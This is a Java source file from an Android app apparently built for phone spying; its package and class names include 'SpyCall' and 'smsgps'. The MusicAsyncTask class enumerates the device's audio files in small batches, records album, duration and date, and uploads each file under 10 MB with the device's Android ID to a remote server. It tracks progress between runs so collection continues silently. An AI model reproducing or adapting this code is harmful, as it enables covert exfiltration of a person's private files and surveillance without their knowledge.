/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.File;
import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.TimeZone;

import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.MediaStore;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class MusicAsyncTask extends AsyncTask<String, Void, String> {
	
	private Context ctx;
	private static final String TAG = "MusicAsyncTask";
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	/**
	 * 
	 */
	public MusicAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {		
		try{
			getMusicDetail();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedMusic();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
/*********************** Start Video *****************************/
	
	public void getMusicDetail() {
		
		String filepath,imagename,imagetype;

		try {
			final String orderBy =MediaStore.Audio.AudioColumns._ID;
			Cursor musiccursor1 = ctx.getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, null, null, null, orderBy);
			int getTotal = musiccursor1.getCount();

			int PreImageCount = SpyCallSharedPrefrence.getsaveMUSIC_PreCount(ctx);
			int remaingCount = getTotal - PreImageCount;
			Log.i("remaining count", ""+remaingCount);

			int pp;
			if (remaingCount > 0) {
				Log.i("remaining count", remaingCount + "");
				if (remaingCount > 2) {
					pp = 2;
				} else {
					pp = remaingCount;
				}
				Cursor musicCursor = ctx.getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, null,
						null, null,
						orderBy + " LIMIT " + PreImageCount + "," + pp);
				// CallActivity.Imagescount=CallActivity.Imagescount+pp;
				int image_column_index = musicCursor.getColumnIndex(MediaStore.Audio.AudioColumns._ID);
				Log.i("getTotalt***************", "" + getTotal);
				int j = 0;
				int countImage = 0;
				while (musicCursor.moveToNext()) {
					countImage++;
					musicCursor.getInt(image_column_index);
					int dataColumnIndex = musicCursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATA);
					int dateIndex = musicCursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATE_ADDED);
					//for finding the size
					int mvideoSizeIndex = musicCursor.getColumnIndex(MediaStore.Audio.AudioColumns.SIZE);
					
					String bucket;
					int bucketColumn = musicCursor.getColumnIndex(MediaStore.Audio.Media.ALBUM);
					
					// Get the field values
					bucket = musicCursor.getString(bucketColumn);

					 // Do something with the values.
					Log.i("ListingImages", " bucket=" + bucket);

					long duration;
					int durationColumn = musicCursor.getColumnIndex(MediaStore.Audio.Media.DURATION);
					
					// Get the field values
					duration = musicCursor.getLong(durationColumn);
					
					String realDuration = convertDuration(duration);
					
					System.out.println(realDuration); 
					System.out.println(duration); 
					
					String mvideoSize=musicCursor.getString(mvideoSizeIndex);
				    double mvideoSizeMB=(Integer.parseInt(mvideoSize))/(1024*1024);
				    
					Log.e("video size", mvideoSize+"");
					
					String ImageDate = musicCursor.getString(dateIndex);
					if (ImageDate.equals("null")) {
						Long.valueOf("1523415");
					}
					long xyz = Long.valueOf(ImageDate);
					Timestamp st = new Timestamp(xyz);
					java.util.Date date1 = new java.util.Date(st.getTime());
					DateFormat df = DateFormat.getDateInstance();
					TimeZone zone1 = TimeZone.getTimeZone(df.getTimeZone()
							.getID()); // For example...
					DateFormat format1 = new SimpleDateFormat(
							"yyyy-MM-dd HH-mm-ss"); // Put your pattern here
					format1.setTimeZone(zone1);
					String SMStime = format1.format(date1);

					/*
					 * Calendar c = Calendar.getInstance(); SimpleDateFormat df
					 * = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); String
					 * SMStime = df.format(c.getTime());
					 */

					filepath = musicCursor.getString(dataColumnIndex);
					Log.i("filepath************************", filepath);

					j = filepath.lastIndexOf("/");
					imagename = filepath.substring(j + 1,filepath.lastIndexOf("."));
					imagetype = filepath.substring(filepath.lastIndexOf(".") + 1);
					try {
						if (Utility.isNetworkAvailable(ctx)) {
							//bm.recycle();
							System.gc();
							//video should be uploaded greater less than equals to 10 mb
							if(mvideoSizeMB<=10){
								int musicPreCount=PreImageCount + pp;
						 	new YourAsyncTask_MusicDetail().execute(filepath, imagename, imagetype, SMStime,"" + countImage, musicPreCount+ "",pp+"",bucket,realDuration+"");
							}else{
								SpyCallSharedPrefrence.saveMUSIC_PreCount(ctx, PreImageCount+countImage);
							}
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				// CallActivity.Imagescount=CallActivity.Imagescount+pp;
				//CellPoliceSharedPreferences.saveVIDEO_PreCount(ctx, PreImageCount + pp);
			} else {
			}
		} catch (Exception e) {
			 //new YourAsyncTask_Facebook().execute();
			e.printStackTrace();
		}
	}

	class YourAsyncTask_MusicDetail extends AsyncTask<String, Void, Void> {

		int getcountImage = 0;
		int getRemainingCount;

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				getcountImage = Integer.parseInt(params[4]);
				getRemainingCount= Integer.parseInt(params[6]);
				String getResponceMusic = uploadDeviceMusic(params[0], params[1],params[2], params[3],params[7],params[8]);
				Log.e(TAG,getResponceMusic);
				JSONObject responseObject = new JSONObject(getResponceMusic);
				if (responseObject.getJSONObject("response").getString("audio").equals("Audio Success")) {
					SpyCallSharedPrefrence.saveMUSIC_PreCount(ctx, Integer.parseInt(params[5]));
					Log.i(TAG, "Success");
				}
			} catch (Exception e) {
				 //new YourAsyncTask_Facebook().execute();
				SpyCallSharedPrefrence.saveMUSIC_PreCount(ctx, Integer.parseInt(params[5]));
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {

			// Log.i("imageuploade resposne******************",
			// getResponceImages);
			Log.i(TAG, ""+getcountImage);
			Log.i(TAG, ""+getRemainingCount);
			if(getcountImage==getRemainingCount)  {
				try {
					 
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	public String uploadDeviceMusic(String imagename, String imagename2,
			String imagetype,String imageDate,String albumname, String duration) {
		String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		
		//Log.e("getDeviceIDString for Upload Images  ",getDeviceIDString);
		Log.i("resonse", "anotherone");
		File file = new File(imagename);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();
		/*String a[] = { "user_id", getUserID_SP};
		arraylist1.add(a);*/
		String b[] = { "date_time",imageDate};
		arraylist1.add(b);
		String c[] = { "device_os", "Android" };
		arraylist1.add(c);
		String e[] = { "type", "3" };
		arraylist1.add(e);
		String f[] = { "upload_device_id", android_id };
		arraylist1.add(f);
		String g[] = { "album", albumname };
		arraylist1.add(g);
		String h[] = { "duration", duration };
		arraylist1.add(h);
		JsonPostRequest postrequest = new JsonPostRequest();
		String imageResponse = postrequest.doPostWithFile3(ConnectUrl.URL_Music_upload, arraylist1,arraylist2, imagename2, imagetype);
		arraylist2.clear();
		arraylist1.clear();
		return imageResponse;
	}
	/*********************** End Video *******************************/
	
	
	public String convertDuration(long duration) {
	    String out = null;
	    long hours=0;
	    try {
	        hours = (duration / 3600000);
	    } catch (Exception e) {
	        // TODO Auto-generated catch block
	        e.printStackTrace();
	        return out;
	    }
	    long remaining_minutes = (duration - (hours * 3600000)) / 60000;
	    String minutes = String.valueOf(remaining_minutes);
	    if (minutes.equals(0)) {
	        minutes = "00";
	    }
	    long remaining_seconds = (duration - (hours * 3600000) - (remaining_minutes * 60000));
	    String seconds = String.valueOf(remaining_seconds);
	    if (seconds.length() < 2) {
	        seconds = "00";
	    } else {
	        seconds = seconds.substring(0, 2);
	    }

	    if (hours > 0) {
	        out = hours + ":" + minutes + ":" + seconds;
	    } else {
	        out = minutes + ":" + seconds;
	    }

	    return out;

	}
}
